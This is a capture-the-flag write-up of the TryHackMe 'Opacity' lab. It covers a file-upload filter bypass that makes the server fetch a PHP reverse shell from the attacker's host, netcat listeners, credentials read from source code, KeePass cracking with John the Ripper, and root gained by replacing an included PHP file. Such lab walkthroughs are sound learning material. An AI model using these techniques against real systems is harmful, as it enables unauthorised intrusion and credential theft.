A room with some new things to learn.

Enumeration part:
```
┌──(kali㉿kali)-[~/Desktop/THM/Opacity]
└─$ sudo nmap -sS 10.10.214.180 > nmap_results.txt           
                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop/THM/Opacity]
└─$ cat nmap_results.txt 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-23 17:15 IST
Nmap scan report for 10.10.214.180
Host is up (0.24s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 6.77 seconds
```
```
┌──(kali㉿kali)-[~/Desktop/THM/Opacity]
└─$ sudo nmap -sS -sV -sC -O -Pn -p22,80,139,445 10.10.214.180 >> nmap_results.txt
                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop/THM/Opacity]
└─$ cat nmap_results.txt 

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-23 17:29 IST
Nmap scan report for 10.10.214.180
Host is up (0.24s latency).

PORT    STATE SERVICE       VERSION
22/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0f:ee:29:10:d9:8e:8c:53:e6:4d:e3:67:0c:6e:be:e3 (RSA)
|   256 95:42:cd:fc:71:27:99:39:2d:00:49:ad:1b:e4:cf:0e (ECDSA)
|_  256 ed:fe:9c:94:ca:9c:08:6f:f2:5c:a6:cf:4d:3c:8e:5b (ED25519)
80/tcp  open  http          Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp open  netbios-ssn   Samba smbd 4.6.2
445/tcp open  microsoft-ds?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Sony X75CH-series Android TV (Android 5.0) (93%), Linux 2.6.32 (93%), Linux 3.11 (93%), Linux 3.2 - 4.9 (93%), Linux 3.5 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-08-23T12:01:11
|_  start_date: N/A
|_nbstat: NetBIOS name: OPACITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.57 seconds
```

After doing the Nmap room on TryHackMe, I have started to use the stealth scan more in every room, even if it is not required, to learn more about the tool.

Again, SSH is useless without any key or ID-password. A website running on port 80 and Samba services.

I tried to connect to the Samba service to see the shares but mothing much:
```
┌──(kali㉿kali)-[~/Desktop/THM/Opacity]
└─$ smbclient -L 10.10.214.180
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (opacity server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 10.10.214.180 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

Upon visiting the site, a login page appears (forgot to take the ss). I tried some SQLi but didn't work.

Next I used dirsearch, to find the subdirectories:
```
┌──(kali㉿kali)-[~/Desktop/THM/Opacity]
└─$ dirsearch -u http://10.10.214.180 -w /usr/share/seclists/Discovery/Web-Content/big.txt  
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                 
 (_||| _) (/_(_|| (_| )                                                                                                                          
                                                                                                                                                 
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 20476

Output File: /home/kali/Desktop/THM/Opacity/reports/http_10.10.214.180/_24-08-23_17-03-21.txt

Target: http://10.10.214.180/

[17:03:21] Starting:                                                                                                                             
[17:04:25] 301 -  314B  - /cloud  ->  http://10.10.214.180/cloud/           
[17:04:36] 301 -  312B  - /css  ->  http://10.10.214.180/css/                                                          
[17:07:13] 403 -  278B  - /server-status                                    
                                                                             
Task Completed                                                                                                                                   
[####################] 100%  20476/20476        37/s       job:1/1  errors:0   
```

We have a subdirectory cloud where we can upload image files only. I tried uploading a JPEG file first, and it got uploaded. Then, I tried to upload a text file, but it didn't get uploaded.

As the site uses PHP, I can upload a PHP reverse shell file and get a reverse shell by opening a listener on my machine using Netcat.
But the problem is we can't upload a PHP file. I looked for "bypassing file upload extension" on Google and came across this: https://book.hacktricks.xyz/pentesting-web/file-upload.
I looked on the site and tried some methods to bypass the filtering. But what worked for me was `<php_file>#.png/jpeg/jpg`.

I uploaded the file as `http://<My_IP:PORT>/php_reverse_shell.php#.jpg` after starting a server on the folder using Python and also started a listener on m terminal using Netcat.
After the file was uploaded, I got the reverse shell.
```
┌──(kali㉿kali)-[~/Desktop/THM/Opacity]
└─$ nc -nlvp 4444                             
listening on [any] 4444 ...
connect to [10.17.94.32] from (UNKNOWN) [10.10.214.180] 54450
Linux opacity 5.4.0-139-generic #156-Ubuntu SMP Fri Jan 20 17:27:18 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 11:48:16 up 28 min,  0 users,  load average: 0.00, 0.00, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

I looked for the files and folders here and there using the shell. There exists one more user, sysadmin on the server. The user.txt file is under the sysadmin folder. But obviously no permission to read the file.

I tried to copy the file to the /tmp folder to see if I could read it there, but permission denied.

On the /var/www/html, under login.php I found some credentials:
```
$ cat login.php 
<?php session_start(); /* Starts the session */

        /* Check Login form submitted */
        if(isset($_POST['Submit'])){
                /* Define username and associated password array */
                $logins = array('admin' => 'oncloud9','root' => 'oncloud9','administrator' => 'oncloud9');
...
```
I used the credentials to log in to the site, and it worked. But the site didn't yield anything. Just a normal site, with no redirection upon clicking the buttons that should redirect somewhere.

I looked inside the /var/backups to find anything and tried to read the '.bash_history' file of sysadmin, but no permission to read that as www-html.

Then I looked inside the /opt folder.
```
$ cd /opt
$ ls
dataset.kdbx
```

A KeePass database. KeePass is an open-source password manager. It requires a key to read the database. I looked for ways to do this.

We have to use `keepass2john` to convert the database to be JTR readable, and then we can use JTR to brute force the passwords.

So I copied the kdbx file to my machine and then did the above.

```
┌──(kali㉿kali)-[~/Desktop/THM/Opacity]
└─$ keepass2john dataset.kdbx > dataset.hash


┌──(kali㉿kali)-[~/Desktop/THM/Opacity]
└─$ john dataset.hash --wordlist=/usr/share/wordlists/rockyou.txt    
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 100000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (dataset)     
1g 0:00:00:17 DONE (2024-08-23 17:41) 0.05707g/s 50.22p/s 50.22c/s 50.22C/s chichi..david1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We get the password for the database. I was unable to figure out how to open the database file. But it was simple. Only to use keepass2 <database_file> to open the file. I didn't have keepass2 installed, so i first installed it using `sudo apt-get install keepass2`.

<img src=https://github.com/user-attachments/assets/77d8a9ef-c271-4975-833f-cb4cb2a9c9b8>

The password can be copied to the clipboard.

Then, I connected to the sysadmin user using SSH.

Under the scripts directory: 
```
sysadmin@opacity:~/scripts$ ls -la
total 16
drwxr-xr-x 3 root     root     4096 Jul  8  2022 .
drwxr-xr-x 6 sysadmin sysadmin 4096 Feb 22  2023 ..
drwxr-xr-x 2 sysadmin root     4096 Jul 26  2022 lib
-rw-r----- 1 root     sysadmin  519 Jul  8  2022 script.php
```

The content of the script.php file is as:
```
sysadmin@opacity:~/scripts$ cat script.php 
<?php

//Backup of scripts sysadmin folder
require_once('lib/backup.inc.php');
...
```

The content of the lib directory:
```
sysadmin@opacity:~/scripts$ ls -la lib
total 132
drwxr-xr-x 2 sysadmin root  4096 Jul 26  2022 .
drwxr-xr-x 3 root     root  4096 Jul  8  2022 ..
-rw-r--r-- 1 root     root  9458 Jul 26  2022 application.php
-rw-r--r-- 1 root     root   967 Jul  6  2022 backup.inc.php
-rw-r--r-- 1 root     root 24514 Jul 26  2022 bio2rdfapi.php
-rw-r--r-- 1 root     root 11222 Jul 26  2022 biopax2bio2rdf.php
-rw-r--r-- 1 root     root  7595 Jul 26  2022 dataresource.php
-rw-r--r-- 1 root     root  4828 Jul 26  2022 dataset.php
-rw-r--r-- 1 root     root  3243 Jul 26  2022 fileapi.php
-rw-r--r-- 1 root     root  1325 Jul 26  2022 owlapi.php
-rw-r--r-- 1 root     root  1465 Jul 26  2022 phplib.php
-rw-r--r-- 1 root     root 10548 Jul 26  2022 rdfapi.php
-rw-r--r-- 1 root     root 16469 Jul 26  2022 registry.php
-rw-r--r-- 1 root     root  6862 Jul 26  2022 utils.php
-rwxr-xr-x 1 root     root  3921 Jul 26  2022 xmlapi.php
```

The script.php file requires the lib/backup.inc.php file. So, I thought if I could alter the content of the backup.inc.php file, I could get a reverse shell. But I only have the read access to the file.

I was repeatedly doing ls -l, dunno why until I noticed and realised:
```
sysadmin@opacity:~/scripts$ ls -l
total 8
drwxr-xr-x 2 sysadmin root     4096 Jul 26  2022 lib
-rw-r----- 1 root     sysadmin  519 Jul  8  2022 script.php
```
The lib subdirectory is owned by sysadmin, so even if I cannot read the backup.inc.php, I can replace it as I(sysadmin) have permission to do that.

So, I created a new file with the name backup.inc.php in the sysadmin directory and deleted the one inside the lib directory. Then I copied the new file with the PHP reverse shell content inside the lib directory.
```
sysadmin@opacity:~/scripts$ rm lib/backup.inc.php 
rm: remove write-protected regular file 'lib/backup.inc.php'? y
sysadmin@opacity:~/scripts$ ls lib
application.php  biopax2bio2rdf.php  dataset.php  owlapi.php  rdfapi.php    utils.php
bio2rdfapi.php   dataresource.php    fileapi.php  phplib.php  registry.php  xmlapi.php
sysadmin@opacity:~/scripts$ cd /home/sysadmin/
sysadmin@opacity:~$ nano backup.inc.php
sysadmin@opacity:~$ cp backup.inc.php scripts/lib/
sysadmin@opacity:~$
```

Opened a listener using Netcat and then:
```
┌──(kali㉿kali)-[~/Desktop/THM/Opacity]
└─$ nc -nlvp 4444         
listening on [any] 4444 ...
connect to [10.17.94.32] from (UNKNOWN) [10.10.214.180] 49410
Linux opacity 5.4.0-139-generic #156-Ubuntu SMP Fri Jan 20 17:27:18 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 12:39:01 up  1:19,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
sysadmin pts/0    10.17.94.32      12:27   13.00s  0.12s  0.12s -bash
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
#
```
After sometime, got the reverse shell as root.
